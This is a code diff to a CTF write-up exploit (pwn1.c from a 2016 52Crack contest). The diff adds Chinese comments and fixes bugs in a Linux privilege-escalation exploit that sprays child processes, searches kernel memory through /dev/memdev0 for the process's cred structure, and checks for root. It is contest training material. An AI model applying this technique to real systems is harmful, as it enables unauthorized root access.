@@ -8,8 +8,8 @@
 * @Email:     liukun@antiy.cn
 * @File Path: /Users/liukun/work/Train/contest/2016-52Crack/2/writeup/pwn1.c
 * @Create Time: 2016-11-16 11:46:18
-* @Last Modified by:   liukun
-* @Last Modified time: 2016-11-16 14:51:51
+* @Last Modified by:   FloatingGuy
+* @Last Modified time: 2016-11-16 17:21:09
 * @Reference:
 *
 * 简单粗暴的方法。
@@ -22,6 +22,11 @@
 * 	 	参数1，2： 指定的一块内存区域,区域大小
 * 	 	参数3,4:  要查找的 内存结构（字节）
 * 	 	返回值： 第一个匹配到的子字节串指针
+*
+* 子进程暂停
+* 	raise(SIGSTOP);
+* 父进程 唤醒子进程（开始执行功能）
+* 	kill(sub_pid, SIGCONT);
 */
 #include <stdio.h>
 #include <stdlib.h>
@@ -98,6 +103,7 @@ struct mem_dev
 
 // 检测 当前进程是否是 root
 static void tryRoot() {
+	// 让子进程暂停，等父进程发送 SIGCONT 信号，再唤醒子进程
 	raise(SIGSTOP);
 	if (getuid() == 0)
 	{
@@ -172,7 +178,7 @@ static int searchCred(int fd) {
 			return 0;
 		}
 
-		p = memmem(buf, 4096, my_cred, sizeof(my_cred));
+		p = memmem(buf, 4096, &my_cred, sizeof(my_cred));
 
 		if (p) {
 			 printf("we find current process's cred\n");
@@ -212,12 +218,12 @@ int main(int argc, char const *argv[])
 	sprayingChildProcess();
 
 	fd = open("/dev/memdev0", O_RDWR);
-	if (fd < 0 {
+	if (fd < 0) {
 		perror("open");
 		goto out;
 	}
 
-	cred = searchCred(fd);
+	cred = searchCred(fd);   //返回相对文件开头的偏移 off_t
 	if (cred == 0) {
 		goto out;
 	}
